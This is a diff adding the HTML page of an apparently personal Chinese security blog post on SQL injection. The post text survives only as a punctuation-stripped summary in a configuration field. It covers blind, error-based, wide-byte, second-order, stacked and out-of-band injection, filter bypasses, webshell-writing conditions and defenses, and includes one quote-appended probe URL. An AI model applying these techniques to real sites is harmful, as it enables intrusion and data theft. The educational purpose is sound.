@@ -1,0 +1,995 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><title>SQL | Attackxu の Blog</title><meta name="keywords" content="sql注入"><meta name="author" content="Attackxu"><meta name="copyright" content="Attackxu"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#f7f9fe"><meta name="mobile-web-app-capable" content="yes"><meta name="apple-touch-fullscreen" content="yes"><meta name="apple-mobile-web-app-title" content="SQL"><meta name="application-name" content="SQL"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="#f7f9fe"><meta property="og:type" content="article"><meta property="og:title" content="SQL"><meta property="og:url" content="http://example.com/2025/05/27/SQL/index.html"><meta property="og:site_name" content="Attackxu の Blog"><meta property="og:description" content="联合查询注入判断是否存在注入最为经典的单引号判断法 利用&amp;#39;或&amp;#39;&amp;#39;来判断是否存在漏洞，在参数后面加上单引号，比如http:&amp;#x2F;&amp;#x2F;xxx&amp;#x2F;abc.php?id&amp;#x3D;1&amp;#39;，如果页面返回错误，则存在SQL注入 原因是无论是字符型还是数字型都会因为单引号个数不匹配而报错 （如果未报"><meta property="og:locale" content="zh-CN"><meta property="og:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta property="article:author" content="Attackxu"><meta property="article:tag"><meta name="twitter:card" content="summary"><meta name="twitter:image" content="https://bu.dusays.com/2023/04/27/64496e511b09c.jpg"><meta name="description" content="联合查询注入判断是否存在注入最为经典的单引号判断法 利用&amp;#39;或&amp;#39;&amp;#39;来判断是否存在漏洞，在参数后面加上单引号，比如http:&amp;#x2F;&amp;#x2F;xxx&amp;#x2F;abc.php?id&amp;#x3D;1&amp;#39;，如果页面返回错误，则存在SQL注入 原因是无论是字符型还是数字型都会因为单引号个数不匹配而报错 （如果未报"><link rel="shortcut icon" href="/favicon.ico"><link rel="canonical" href="http://example.com/2025/05/27/SQL/"><link rel="preconnect" href="//cdn.cbd.int"/><meta name="google-site-verification" content="xxx"/><meta name="baidu-site-verification" content="code-xxx"/><meta name="msvalidate.01" content="xxx"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.cbd.int/node-snackbar@0.1.16/dist/snackbar.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.cbd.int/@fancyapps/ui@5.0.28/dist/fancybox/fancybox.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  linkPageTop: undefined,
+  peoplecanvas: {"enable":true,"img":"https://upload-bbs.miyoushe.com/upload/2024/07/27/125766904/ba62475f396df9de3316a08ed9e65d86_5680958632268053399..png"},
+  postHeadAiDescription: {"enable":true,"gptName":"AnZhiYu","mode":"local","switchBtn":false,"btnLink":"https://afdian.net/item/886a79d4db6711eda42a52540025c377","randomNum":3,"basicWordCount":1000,"key":"xxxx","Referer":"https://xx.xx/"},
+  diytitle: {"enable":true,"leaveTitle":"w(ﾟДﾟ)w 不要走！再看看嘛！","backTitle":"♪(^∇^*)欢迎肥来！"},
+  LA51: undefined,
+  greetingBox: undefined,
+  twikooEnvId: '',
+  commentBarrageConfig:undefined,
+  music_page_default: "nav_music",
+  root: '/',
+  preloader: {"source":3},
+  friends_vue_info: undefined,
+  navMusic: true,
+  mainTone: undefined,
+  authorStatus: undefined,
+  algolia: undefined,
+  localSearch: undefined,
+  translate: {"defaultEncoding":2,"translateDelay":0,"msgToTraditionalChinese":"繁","msgToSimplifiedChinese":"简","rightMenuMsgToTraditionalChinese":"转为繁体","rightMenuMsgToSimplifiedChinese":"转为简体"},
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    simplehomepage: true,
+    post: false
+  },
+  runtime: '天',
+  date_suffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: {"copy":true,"copyrightEbable":false,"limitCount":50,"languages":{"author":"作者: Attackxu","link":"链接: ","source":"来源: Attackxu の Blog","info":"著作权归作者所有。商业转载请联系作者获得授权，非商业转载请注明出处。","copySuccess":"复制成功，复制和转载请标注本文地址"}},
+  lightbox: 'fancybox',
+  Snackbar: {"chs_to_cht":"你已切换为繁体","cht_to_chs":"你已切换为简体","day_to_night":"你已切换为深色模式","night_to_day":"你已切换为浅色模式","bgLight":"#425AEF","bgDark":"#1f1f1f","position":"top-center"},
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.min.js',
+      css: 'https://cdn.cbd.int/flickr-justified-gallery@2.1.2/dist/fjGallery.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: true,
+  isAnchor: false,
+  shortcutKey: undefined,
+  autoDarkmode: true
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  configTitle: 'Attackxu の Blog',
+  title: 'SQL',
+  postAI: '',
+  pageFillDescription: '联合查询注入, 判断是否存在注入, 判断闭合方式：, 判断SQL注入的类型, 数字型, 字符型, 判断表中字段数, 确定显示位, 盲注, 布尔盲注, 注入流程, 判断是否存在注入, 获取数据库名, 获取数据库名长度, 获取数据库名, 获取表名, 获取表的数量, 获取表名长度, 获取具体表名, 获取字段名（列名）, 获取某个表中有多少列, 获取列名长度, 获取列名, 获取记录, 获取列中有多少行记录, 获取记录长度, 获取具体数据, 时间盲注, 时间盲注函数, 注入流程, 判断是否存在注入, 获取数据库名, 获取数据库名长度, 报错注入, 原理, 报错注入函数, 注入流程, 判断是否存在注入注入类型, 获取数据库名, 获取数据库中表名, 遇见问题, 获取表中字段名, 获取表中记录, 宽字节注入, 原理, 注入流程, 判断注入, 注入（使用联合查询注入）, 二次注入, 实现二次注入源码中有对应的转义（ltfont style=background-colorrgba(255 255 255 0)gtmagic_quotes_gpc（魔术引号转义）lt/fontgt）或使用转义函数（ltfont style=background-colorrgba(255 255 255 0)gtaddslasheslt/fontgt）, 堆叠注入, 带外注入, 常见过滤和绕过, 关键字被过滤, 函数被过滤, 注释符被过滤, 单引号被过滤, 防御, Tips, 万能密码登录, 常见head头注入, 如果屏蔽了错误信息显示如何判断是否存在注入, 写shell条件, 总结联合查询注入判断是否存在注入最为经典的单引号判断法利用或来判断是否存在漏洞在参数后面加上单引号比如如果页面返回错误则存在注入原因是无论是字符型还是数字型都会因为单引号个数不匹配而报错如果未报错不代表不存在注入因为有可能是页面对单引号进行了过滤这时可以使用判断语句进行注入判断闭合方式结果一如果都报错判断闭合符为整形闭合结果二如果单引号报错双引号不报错继续尝试结果无报错判断闭合符为单引号闭合结果报错判断闭合符可能为单引号加括号结果三如果单引号不报错双引号报错继续尝试结果结果无报错判断闭合符为双引号闭合结果报错判断闭合符可能为双引号加括号判断注入的类型干货如何判断注入点判断是否存在注入博客通常注入数据类型分为两种字符型数字型数字型和字符型的区别就是网站源文件中的查询语句有没有单引号有单引号时我们需要闭合单引号为字符型数字型用经典的和来判断地址中输入页面依旧运行正常继续进行下一步地址中继续输入页面运行错误则说明此注入为数字型注入原因当输入时后台执行语句表名没有语法错误且逻辑判断为正确所以返回正常当输入时后台执行语句表名没有语法错误但是逻辑判断为假所以返回错误字符型用和来判断地址中输入页面运行正常继续进行下一步地址中继续输入页面运行错误则说明此注入为字符型注入前者显示后者不显示说明单引号起作用了前者最终查询的是并且后者最终查询的是并且因为不成立所以整条语句也不成立页面返回为空或者错误是由于语句不成立导致的当注入类型为字符型时牵涉到的隐式类型转换数字字符数字字符数字数字就是当我们输入查询的内容为最终进行隐式转换后查询的还是为因此当注入点为字符型时我们输入数字型的判断语句和都会经过隐式转换为因此查询结果相同判断表中字段数用来判断原理是用来根据指定的列来对结果进行排序当后的数字大于当前的列数时就会报错当我们使用时如果注入点为字符型输入后台查询为表名此时单引号没有闭合因此要在数字后面加上注释掉多余的在中会被自动编码为如果不进行编码那么无法传到后端数据库中带入查询时无法起作用确定显示位显示位服务端执行语句查询数据库中的内容客户端将数据展示在页面中这个展示数据的位置就叫做显示位操作符用于合并两个或多个的结果集结果集的列名总是等于中第一个语句中的列名内的语句必须拥有相同数量的列列也必须有相似的数据类型每条语句中列的顺序必须相同列数在实战中一般不查询左边的内容这是因为程序在展示数据的时候通常只会取结果集的第一行数据所以只要让第一行查询的结果是空集即左边的子句查询结果为空那么右边的查询结果自然就成为了第一行打印在网页上了所以让左边查询不到可以将其改为负数或者改为比较大的数字盲注前端里没有显示位不能返回语句执行错误的信息输入正确和错误返回的信息都是一致的类似于无法说话的人只能通过点头和摇头回复正确与否布尔盲注在页面中正确执行了用户构造的语句返回一种页面如果执行错误返回另一种页面和来判断数量来判断长度和来判断具体数据注入流程判断是否存在注入获取数据库长度逐字猜解数据库名猜解表名数量猜解某个表名长度逐字猜解表名猜解列名数量猜解某个列名长度逐字猜解列名判断数据数量猜解某条数据长度逐位猜解数据判断是否存在注入一般使用来进行判断一般输入时页面会返回两种情况一种是对应一种是对应举例当输入时页面都返回存在表示当输入时页面返回不存在表示页面返回两种情况说明存在注入获取数据库名获取数据库名长度使用函数来判断获取数据库名用函数对数据库名进行字符串截取以次判断每一位上的字母修改的位置可以得出其他位置的字母从而得出完整的数据库名可以爆破获取表名获取表的数量使用统计数据表中包含的记录行的总数或者根据查询结果返回列中包含的数据行获取表名长度分别获取两个表的表名长度两个括号里面的括号表示里面是一个整体外面的括号是函数带的括号如果只写一个的话有逗号可能会被认为是两个参数导致函数错误用限制只输出第一行的内容也就是第一个表名因为是有两个表在输出的时候每个表占一行输出先求第一个表长度只需要第一个表名将的起始位置改为步长还为能够只输出第二行第二张表获取具体表名分别获取两个表具体的表名使用表示为第一个表从第一个表的第一个位置截取步长为第一个表的第一个字符第二张表将的第一个参数改为爆破点和爆破第一个表相同获取字段名列名获取某个表中有多少列分别查看两个表各有多少列获取列名长度分别获取两个表的每个列名的长度写在外面写在里面依次修改的第一个参数从因为表有三列和后面的数字参数即可得出表每一列的列名的长度将表名改为爆破点和上面一样将第一个位置增加到一共列获取列名分别获取两个表中每一列的具体列名依次改变函数截取的起始位直到即可完整得到第一个列名爆破点的第二个参数第一个表的第一列列名长度为后面的字符和要获取第二个列名只需要修改的起始位即可以此类推要获得表的列名时只需要更改为爆破点跟上面一样获取记录表中的每一列有多少行数据某行数据有多长具体是多少获取列中有多少行记录获取记录长度或获取具体数据表中的列中五行数据中第一行数据长度为求出具体数据内容改变的第一个参数可以改变所要求的行数时间盲注不管用户输入什么网站都没有正确或者错误的页面回显利用页面的响应时间来判断语句有没有执行时间盲注函数为次数为执行语句将一个语句执行很多次从而达到时间盲注效果通常很大比如注入流程判断是否存在注入获取数据库长度逐字猜解数据库名猜解表名数量猜解某个表名长度逐字猜解表名猜解列名数量猜解某个列名长度逐字猜解列名判断数据数量猜解某条数据长度逐位猜解数据判断是否存在注入函数当使用函数时观察页面响应时间如果生效则说明存在注入获取数据库名获取数据库名长度第一个条件成立就执行否则执行三元表达式页面延迟就为的长度其他的步骤和布尔盲注相同只需要把布尔盲注的语句填入中的第一个参数即可报错注入页面上没有显示位但是会输出语句执行错误的信息人为制造错误条件使得查询结果能够出现在错误信息中适用于联合查询受阻后台没有屏蔽数据库报错信息发生错误时会输出错误信息到前端页面有的布尔盲注也可以用报错注入原理开发人员使用了函数将错误信息输出到前端因此可以人为地使用一些指定的函数来制造报错信息从而获取报错信息中特定的信息使用常规的联合查询注入可以发现时无法注出数据的用盲注又太费时费力所以可以结合页面的报错信息使用报错注入报错注入函数从开始提供两个用于查询和修改的函数通过函数进行报错来进行注入语法参数文档的名称参数格式的字符串参数替换查找到的符合条件的数据语法第一个参数目标文档第二个参数路径法表示的查找路径定位必须是有效的否则会发生错误我们可以利用这个特性爆出我们想要的数据注意必须是在那里传特殊字符才会报错特殊字符可以使用的进制来表示是一个位置用了特殊字符就不能再添加参数所以可以用函数将和自己想注出的数据进行拼接把等字符串无缝拼接起来只会报错个字符回显是位我们在获取表名或列名的时候可以获取但有时数据太大我们无法得到所有的内容注入流程判断是否存在注入注入类型方式和联合查询注入盲注一样输入和如果输入页面正常显示输入页面有报错则说明很有可能存在注入再使用来判断注入类型同样与盲注测试方式一样获取数据库名获取数据库名的意义漏洞挖掘项目数据库名算敏感信息原因首先回到语法格式上我们必须在这个参数里填充格式的字符串但是如果我们填充一个不是格式的字符串就会产生报错所以语句就变成了前后两个是随便填充的内容目的是满足三个参数由于只会对特殊字符进行报错这里我们可以用的进制来表示所以就变成了但是由于数据库无法认识中间的内容所以就无法成功执行所以可以用函数把多个字符串合并成一个就变成了获取数据库中表名更改中的参数的函数中的第二个参数内容里面的语句加的原因是函数不允许里面有空格要用括号使里面的查询为一个整体遇见问题问题描述方法子查询返回多于一行使用修改第一个参数以至于获取每一行使用数据库中的表更多内容字段和大于位导致无法一次性显示出来使用截取先截取前位再截取后位分步获取获取表中字段名获取表中记录宽字节注入是一种绕过方式一个字符的大小是一个字节窄字节一个字符的大小是两个字节宽字节像等这些编码都是常说的宽字节也就是只有两个字节英文默认占一个字节中文占两个字节原理网站对注入做了防护例如使用一些中的转义函数等还有一种是配置文件的设置不过高版本已经移除此功能这些函数就是过滤用户输入的一些数据对特殊字符加上反斜杠进行转义可以使用宽字节注入绕过转义宽字节注入指的是数据库在使用宽字节编码时会认为两个字符是一个汉字前一个码要大于比如才到汉字的范围而且当我们输入时会调用转义函数将单引号变为其中的十六进制是的编码会认为是一个宽字节也就是運从而使单引号闭合逃逸进行注入攻击運输入经过函数进行转义转义为经过编码变成運用户输入过滤函数代码层的处理请求中的当在代码层被写入时三个字符集客户端连接层结果集都是编码注入流程判断注入输入函数将转义为输入此时转义后结合形成一个汉字查询成功而引起报错说明存在注入结尾添加注释使单引号闭合按照正常方法注入即可注入使用联合查询注入步骤和正常注入一样获取字段数确定显示位注入查看数据库名表名和列名要用引起来该怎么注入不能直接在单引号前面再加上同样会使查询内容改变查询错误使用十六进制编码将我们需要单引号引起来的内容数据库名表名列名进行十六进制编码并再编码后前面加上不是所有情况下的表名列名都要用编码是只有单引号引起来的需要二次注入黑盒思路分析功能有添加后对数据操作的地方功能点很难测出语句的符号影响转义不能直接看出容错处理代码中是否有找到在哪里触发执行置入的语句白盒思路后进入或的功能的代码块源代码去审注入条件插入时有转义函数或配置后续有利用插入的数据先插入后利用有转义函数转义为数据才能正常写入才能二次注入实现二次注入源码中有对应的转义魔术引号转义或使用转义函数原理注册新用户时将注入的内容包含在注册的用户名后成功注入并查看数据库数据库中也存放了响应的注入语句正常登录登陆后随便输入旧密码和新密码点击修改后由于在登录状态下修改密码时使用了的语法将我们的用户名带入查询触发了注入发现注入成功错误回显版本号二次注入第关第关博客一共三个页面登录页面注册页面忘记密码页面看到这里我们可以思考有什么可以注入的地方在修改密码的时候会带入查询我们先注册一个用户为闭合做准备登录后修改他的密码我们这里原密码为修改为回显显示修改成功此时修改的是的密码原因就是当我们在修改密码时带入的查询在修改的用户名处进行了注入我们的用户名经过单引号闭合和注释变成了我们修改的就为的密码堆叠注入堆叠注入触发的条件很苛刻因为堆叠注入原理就是通过结束符同时执行多条语句例如中的函数与之相对应的只能执行一条所以要想目标存在堆叠注入在目标主机存在类似于这样的函数根据数据库类型决定是否支持多条语句执行简单来讲就是如果使用则不存在堆叠注入如果使用则存在堆叠注入支持堆叠数据库等条件存在注入未对进行过滤使用了使用在传参之后加后面可以直接写第二条语句让他一起执行强网杯随便注题型这似乎是尝试显示数据库类似于第一个似乎是尝试显示表另一次尝试从具有特定名称的表中显示列类似于前一个试图从表中选择名为的列确保表和列存在由于提示不能使用等所以使用动态语句将想要执行的语句转换为进制带外注入产生原因有部分注入点是没有回显的所有读取也是没回显的采用带外的形式回显数据注入条件高权限且支持开启支持条件太苛刻了而且已经有权限且能够直接写文件写马进去了使用在注入点在平台观察回显常见过滤和绕过关键字被过滤等关键字被过滤解决方法使用大写绕过将被过滤的字符改为大写字符函数被过滤被过滤我们更改为大写发现也不能绕过因为它是对整体进行过滤解决方法注释绕过注释符被过滤当我们使用单引号闭合时我们发现仍显示没有单引号闭合解决方法使用万能公式在前构造判断列数我们可以依次增加联合查询的字段数来判断列数获取表名获取列名获取具体数据单引号被过滤使用十六进制编码编码内容前面再加上注入语句中用单引号就不要编码编码就不用单引号路径表名数据库名等文件读取时可以也编码路径防御对用户输入内容进行过滤预编译最小权限原则对于数据库用户要被授予最小权限避免使用超级用户连接数据库错误信息处理限制返回错误信息时应该设置一个固定的错误信息避免攻击者通过错误信息获取更多的信息预编译为何能够防御注入分离代码与数据预编译将语句的结构与用户输入的数据分开处理语句的模板在预编译时固定用户输入的数据随后以参数形式绑定确保数据不会被解释为代码参数化查询预编译使用参数化查询用户输入的数据作为参数传递数据库不会将其视为语句的一部分从而避免了恶意输入改变逻辑自动转义预编译时数据库驱动会自动对参数进行转义确保特殊字符如单引号不会被误解为语法的一部分防止恶意输入由于用户输入被视为数据而非代码恶意输入无法破坏语句的结构从而防止了注入攻击示例非预编译易受注入预编译防止注入总结预编译通过分离代码与数据使用参数化查询和自动转义有效防止了注入攻击万能密码登录密码随便常见头注入常见的注入点产生位置为是的一部分当浏览器向服务器发送请求的时候一般会带上告诉服务器我是从哪个页面链接过来的服务器基此可以获得一些信息用于处理简称头它代表客户端用于记录代理信息的每经过一级代理匿名代理除外代理服务器都会把这次请求的来源追加在中有时也用其复数形式指某些网站为了辨别用户身份进行跟踪而储存在用户本地终端上的数据通常经过加密一般只记录真实发出请求的客户端看下面的例子代表请求由发出经过三层代理第一层是第二层是而本次请求的来源是第三层代理如果配置了将会是所以如果只有一层代理这两个头的值就是一样的请求头允许客户端声明它可以理解的自然语言以及优先选择的区域方言如果屏蔽了错误信息显示如何判断是否存在注入如果用户屏蔽了异常信息的显示我们就无法直接通过页面信息确认是否是注入但是我们可以通过后端响应的状态码来确定是否是注入点如果返回的状态码为那么我们就可以初步的判定参数存在注入了写条件在注入中写的前提是数据库具有写入文件的权限并且目标环境支持解析可执行脚本如一般来说写的条件可以归纳如下目标数据库必须支持写文件不同数据库写文件的方式不同必须满足以下条件需要权限可使用需要或支持直接写入可用写入但需要权限目录必须可写目标数据库可以写入的路径必须在目录下如可能需要找到可写目录如果数据库用户没有写入目录的权限写会失败目标环境能解析环境可以写入文件环境可以写入或文件环境可以写入文件如果写入等服务器不会执行而是作为普通文件下载具体的注入写方法写条件需要权限服务器开启或指向可写目录利用利用限制可能限制写入路径目标环境可能禁用了写条件需要开启默认关闭允许解析或开启如果被禁用使用写入使用方式写入写条件语句需要权限目标目录可写使用写入如果被限制可以用写条件需要写入权限需要级别的权限写入其他方法日志文件写入如果数据库本身没有写文件权限但日志文件可控并且可执行可以通过日志注入方式写入方法修改日志开启并写入内存提权如果数据库不能直接写文件但可以执行动态链接库可以上传到数据库目录创建自定义函数调用提权绕过安全限制绕过如果限制查看当前限制路径寻找目录是否可写绕过限制如果被禁用尝试绕过限制如果限制文件访问尝试伪协议上传解除限制关键防御措施禁用限制禁用最小化数据库用户权限目录禁止写入日志监控注入行为总结注入写的核心条件数据库支持写文件目录可写服务器解析绕过数据库和系统的安全限制不同数据库的写方法数据库写入方式适用环境需权限需权限需需级别权限特殊绕过方式日志文件注入内存提权时间盲注写入如果数据库配置严格直接写难度较大但可以结合文件包含漏洞或日志注入绕过限制',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: true,
+  postUpdate: '2025-05-27 19:11:04',
+  postMainColor: '',
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+      win.saveToLocal = {
+        set: (key, value, ttl) => {
+          if (ttl === 0) return
+          const now = Date.now()
+          const expiry = now + ttl * 86400000
+          const item = {
+            value,
+            expiry
+          }
+          localStorage.setItem(key, JSON.stringify(item))
+        },
+      
+        get: key => {
+          const itemStr = localStorage.getItem(key)
+      
+          if (!itemStr) {
+            return undefined
+          }
+          const item = JSON.parse(itemStr)
+          const now = Date.now()
+      
+          if (now > item.expiry) {
+            localStorage.removeItem(key)
+            return undefined
+          }
+          return item.value
+        }
+      }
+    
+      win.getScript = (url, attr = {}) => new Promise((resolve, reject) => {
+        const script = document.createElement('script')
+        script.src = url
+        script.async = true
+        script.onerror = reject
+        script.onload = script.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          script.onload = script.onreadystatechange = null
+          resolve()
+        }
+
+        Object.keys(attr).forEach(key => {
+          script.setAttribute(key, attr[key])
+        })
+
+        document.head.appendChild(script)
+      })
+    
+      win.getCSS = (url, id = false) => new Promise((resolve, reject) => {
+        const link = document.createElement('link')
+        link.rel = 'stylesheet'
+        link.href = url
+        if (id) link.id = id
+        link.onerror = reject
+        link.onload = link.onreadystatechange = function() {
+          const loadState = this.readyState
+          if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+          link.onload = link.onreadystatechange = null
+          resolve()
+        }
+        document.head.appendChild(link)
+      })
+    
+      win.activateDarkMode = () => {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#18171d')
+        }
+      }
+      win.activateLightMode = () => {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#f7f9fe')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          const isDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches
+          const isLightMode = window.matchMedia('(prefers-color-scheme: light)').matches
+          const isNotSpecified = window.matchMedia('(prefers-color-scheme: no-preference)').matches
+          const hasNoSupport = !isDarkMode && !isLightMode && !isNotSpecified
+
+          if (t === undefined) {
+            if (isLightMode) activateLightMode()
+            else if (isDarkMode) activateDarkMode()
+            else if (isNotSpecified || hasNoSupport) {
+              const now = new Date()
+              const hour = now.getHours()
+              const isNight = hour <= 6 || hour >= 18
+              isNight ? activateDarkMode() : activateLightMode()
+            }
+            window.matchMedia('(prefers-color-scheme: dark)').addListener(e => {
+              if (saveToLocal.get('theme') === undefined) {
+                e.matches ? activateDarkMode() : activateLightMode()
+              }
+            })
+          } else if (t === 'light') activateLightMode()
+          else activateDarkMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+      const detectApple = () => {
+        if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+          document.documentElement.classList.add('apple')
+        }
+      }
+      detectApple()
+    })(window)</script><meta name="generator" content="Hexo 7.3.0"></head><body data-type="anzhiyu"><div id="web_bg"></div><div id="an_music_bg"></div><div id="loading-box" onclick="document.getElementById(&quot;loading-box&quot;).classList.add(&quot;loaded&quot;)"><div class="loading-bg"><img class="loading-img nolazyload" alt="加载头像" src="https://npm.elemecdn.com/anzhiyu-blog-static@1.0.4/img/avatar.jpg"/><div class="loading-image-dot"></div></div></div><script>const preloader = {
+  endLoading: () => {
+    document.getElementById('loading-box').classList.add("loaded");
+  },
+  initLoading: () => {
+    document.getElementById('loading-box').classList.remove("loaded")
+  }
+}
+window.addEventListener('load',()=> { preloader.endLoading() })
+setTimeout(function(){preloader.endLoading();},10000)
+
+if (true) {
+  document.addEventListener('pjax:send', () => { preloader.initLoading() })
+  document.addEventListener('pjax:complete', () => { preloader.endLoading() })
+}</script><link rel="stylesheet" href="https://cdn.cbd.int/anzhiyu-theme-static@1.1.10/progress_bar/progress_bar.css"/><script async="async" src="https://cdn.cbd.int/pace-js@1.2.4/pace.min.js" data-pace-options="{ &quot;restartOnRequestAfter&quot;:false,&quot;eventLag&quot;:false}"></script><div class="post" id="body-wrap"><header class="post-bg" id="page-header"><nav id="nav"><div id="nav-group"><span id="blog_name"><a id="site-name" href="/" accesskey="h"><div class="title">Attackxu の Blog</div><i class="anzhiyufont anzhiyu-icon-house-chimney"></i></a></span><div class="mask-name-container"><div id="name-container"><a id="page-name" href="javascript:anzhiyu.scrollToDest(0, 500)">PAGE_NAME</a></div></div><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 文章</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/archives/"><i class="anzhiyufont anzhiyu-icon-box-archive faa-tada" style="font-size: 0.9em;"></i><span> 隧道</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/categories/"><i class="anzhiyufont anzhiyu-icon-shapes faa-tada" style="font-size: 0.9em;"></i><span> 分类</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/tags/"><i class="anzhiyufont anzhiyu-icon-tags faa-tada" style="font-size: 0.9em;"></i><span> 标签</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 友链</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/fcircle/"><i class="anzhiyufont anzhiyu-icon-artstation faa-tada" style="font-size: 0.9em;"></i><span> 朋友圈</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/comments/"><i class="anzhiyufont anzhiyu-icon-envelope faa-tada" style="font-size: 0.9em;"></i><span> 留言板</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 我的</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/music/"><i class="anzhiyufont anzhiyu-icon-music faa-tada" style="font-size: 0.9em;"></i><span> 音乐馆</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/bangumis/"><i class="anzhiyufont anzhiyu-icon-bilibili faa-tada" style="font-size: 0.9em;"></i><span> 追番页</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/album/"><i class="anzhiyufont anzhiyu-icon-images faa-tada" style="font-size: 0.9em;"></i><span> 相册集</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/air-conditioner/"><i class="anzhiyufont anzhiyu-icon-fan faa-tada" style="font-size: 0.9em;"></i><span> 小空调</span></a></li></ul></div><div class="menus_item"><a class="site-page" href="javascript:void(0);"><span> 关于</span></a><ul class="menus_item_child"><li><a class="site-page child faa-parent animated-hover" href="/about/"><i class="anzhiyufont anzhiyu-icon-paper-plane faa-tada" style="font-size: 0.9em;"></i><span> 关于本人</span></a></li><li><a class="site-page child faa-parent animated-hover" href="/essay/"><i class="anzhiyufont anzhiyu-icon-lightbulb faa-tada" style="font-size: 0.9em;"></i><span> 闲言碎语</span></a></li><li><a class="site-page child faa-parent animated-hover" href="javascript:toRandomPost()"><i class="anzhiyufont anzhiyu-icon-shoe-prints1 faa-tada" style="font-size: 0.9em;"></i><span> 随便逛逛</span></a></li></ul></div></div></div><div id="nav-right"><div class="nav-button" id="randomPost_button"><a class="site-page" onclick="toRandomPost()" title="随机前往一个文章" href="javascript:void(0);"><i class="anzhiyufont anzhiyu-icon-dice"></i></a></div><input id="center-console" type="checkbox"/><label class="widget" for="center-console" title="中控台" onclick="anzhiyu.switchConsole();"><i class="left"></i><i class="widget center"></i><i class="widget right"></i></label><div id="console"><div class="console-card-group-reward"><ul class="reward-all console-card"><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png" target="_blank"><img class="post-qr-code-img" alt="微信" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-weichat.png"/></a><div class="post-qr-code-desc">微信</div></li><li class="reward-item"><a href="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png" target="_blank"><img class="post-qr-code-img" alt="支付宝" src="https://npm.elemecdn.com/anzhiyu-blog@1.1.6/img/post/common/qrcode-alipay.png"/></a><div class="post-qr-code-desc">支付宝</div></li></ul></div><div class="console-card-group"><div class="console-card-group-left"><div class="console-card" id="card-newest-comments"><div class="card-content"><div class="author-content-item-tips">互动</div><span class="author-content-item-title"> 最新评论</span></div><div class="aside-list"><span>正在加载中...</span></div></div></div><div class="console-card-group-right"><div class="console-card tags"><div class="card-content"><div class="author-content-item-tips">兴趣点</div><span class="author-content-item-title">寻找你感兴趣的领域</span><div class="card-tags"><div class="item-headline"></div><div class="card-tag-cloud"><a href="/tags/API%E5%AE%89%E5%85%A8/" style="font-size: 1.05rem;">API安全<sup>2</sup></a><a href="/tags/CRLF/" style="font-size: 1.05rem;">CRLF<sup>1</sup></a><a href="/tags/CSRF/" style="font-size: 1.05rem;">CSRF<sup>1</sup></a><a href="/tags/HTTP/" style="font-size: 1.05rem;">HTTP<sup>4</sup></a><a href="/tags/JAVA/" style="font-size: 1.05rem;">JAVA<sup>6</sup></a><a href="/tags/JavaScript/" style="font-size: 1.05rem;">JavaScript<sup>2</sup></a><a href="/tags/PHP/" style="font-size: 1.05rem;">PHP<sup>2</sup></a><a href="/tags/RCE/" style="font-size: 1.05rem;">RCE<sup>1</sup></a><a href="/tags/SSRF/" style="font-size: 1.05rem;">SSRF<sup>1</sup></a><a href="/tags/XSS/" style="font-size: 1.05rem;">XSS<sup>1</sup></a><a href="/tags/XXE/" style="font-size: 1.05rem;">XXE<sup>1</sup></a><a href="/tags/sql%E6%B3%A8%E5%85%A5/" style="font-size: 1.05rem;">sql注入<sup>2</sup></a><a 